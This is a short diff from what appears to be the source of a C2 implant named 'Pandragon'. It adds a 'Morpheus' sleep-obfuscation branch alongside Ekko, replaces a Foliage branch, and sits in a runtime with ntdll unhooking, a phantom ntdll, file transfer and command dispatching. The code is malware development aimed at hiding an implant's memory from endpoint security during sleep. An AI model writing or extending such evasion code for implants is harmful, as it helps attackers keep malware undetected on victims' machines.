@@ -43,8 +43,14 @@ void ExecuteSleep(functionTable* funcTable, uint32_t sleep_ms, uint8_t jitter_pc
         /* Fallback to plain sleep if Ekko fails */
         g_debugPrint("[!] Ekko sleep obfuscation failed, falling back to plain Sleep");
         runtime.setSleepState(PandragonRuntime::SleepState::AWAKE);
-    } else if (runtime.getSleepObfMethod() == SleepObfMethod::FOLIAGE){
+    } else if (runtime.getSleepObfMethod() == SleepObfMethod::MORPHEUS){
         runtime.setSleepState(PandragonRuntime::SleepState::SLEEPING);
+        if (SleepObf_Morpheus(funcTable, &runtime.getConfig(), sleep_ms, jitter_pct)) {
+            runtime.setSleepState(PandragonRuntime::SleepState::AWAKE);
+            return;
+        }
+        g_debugPrint("[!] Morpheus sleep obfuscation failed, falling back to plain Sleep");
+        runtime.setSleepState(PandragonRuntime::SleepState::AWAKE);
    }
 
    funcTable->Sleep(ApplySleepJitter(sleep_ms, jitter_pct));
@@ -71,9 +77,9 @@ PandragonRuntime::PandragonRuntime()
     , m_fileTransferManager(nullptr)
     , m_networkManager(nullptr)
     , m_commandDispatcher(nullptr)
+    , m_sleepState(SleepState::AWAKE)
     , m_phantomNtdllBase(nullptr)
     , m_ntdllUnhooked(false)
-    , m_sleepState(SleepState::AWAKE)
 {
     __memset(&m_config, 0, sizeof(m_config));
 }
